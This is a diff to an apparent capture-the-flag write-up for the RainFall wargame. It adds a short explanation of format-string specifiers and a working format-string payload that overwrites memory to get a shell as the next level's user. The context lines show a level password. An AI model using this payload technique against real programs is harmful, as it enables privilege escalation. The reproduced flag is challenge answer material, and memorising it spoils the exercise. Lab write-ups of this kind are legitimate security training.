@@ -53,3 +53,17 @@ level4
 cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
+
+Go further:
+
+- `%X$x`: take the X argument'
+- `%hn`: write only 2 bytes of the address
+
+Another payload with this new things:
+
+```bash
+level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "%60d%4$n")'; cat) | ./level3
+Wait what?!
+whoami
+level4
+```
